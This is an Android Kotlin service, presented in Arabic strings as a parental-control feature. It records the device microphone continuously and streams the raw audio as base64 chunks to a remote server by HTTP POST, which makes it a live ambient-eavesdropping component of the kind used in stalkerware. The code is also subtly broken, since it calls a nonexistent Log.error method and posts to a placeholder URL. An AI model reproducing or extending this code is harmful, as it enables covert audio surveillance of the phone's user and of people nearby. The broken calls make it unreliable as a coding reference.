package com.rabahdj.app.guard

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class MediaStreamingService : Service() {

    private var isStreaming = false
    private var audioRecord: AudioRecord? = null
    private val bufferSize = AudioRecord.getMinBufferSize(16000, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
            private val serverUrl = "https://onrender.com"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification: Notification = NotificationCompat.Builder(this, "CHANNEL_STREAM_ID")
            .setContentTitle("تطبيق الرقابة الأبوية")
            .setContentText("يتم تشغيل ميزات الحماية المحيطية وبث الصوت حالياً...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()

        startForeground(102, notification)

        if (intent?.action == "START_STREAM" && !isStreaming) {
            startAudioCapture()
        }

        return START_STICKY
    }

    private fun startAudioCapture() {
        isStreaming = true
        try {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                16000,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                bufferSize
            )

            audioRecord?.startRecording()
            
            thread(start = true) {
                val audioBuffer = ByteArray(bufferSize)
                while (isStreaming) {
                    val readBytes = audioRecord?.read(audioBuffer, 0, bufferSize) ?: 0
                    if (readBytes > 0) {
                        val chunk = audioBuffer.copyOf(readBytes)
                        sendAudioToServer(chunk)
                    }
                    Thread.sleep(300) // إرسال نبضات صوتية كل 300 مللي ثانية
                }
            }
        } catch (e: Exception) {
            Log.error("MediaStreaming", "فشل بدء التقاط الصوت الجذري", e)
        }
    }

    private fun sendAudioToServer(audioData: ByteArray) {
        thread {
            try {
                val base64Audio = Base64.encodeToString(audioData, Base64.DEFAULT)
                val url = URL(serverUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                
                val jsonPayload = "{\"audio\":\"${base64Audio.trim()}\"}"
                conn.outputStream.use { os ->
                    os.write(jsonPayload.toByteArray(Charsets.UTF_8))
                }
                val code = conn.responseCode
                Log.d("MediaStreaming", "حالة إرسال دفق الصوت للسيرفر: $code")
                conn.disconnect()
            } catch (e: Exception) {
                Log.error("MediaStreaming", "فشل إرسال الصوت عبر الشبكة", e)
            }
        }
    }

    override fun onDestroy() {
        isStreaming = false
        audioRecord?.stop()
        audioRecord?.release()
        audioRecord = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                "CHANNEL_STREAM_ID",
                "Media Streaming Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }
}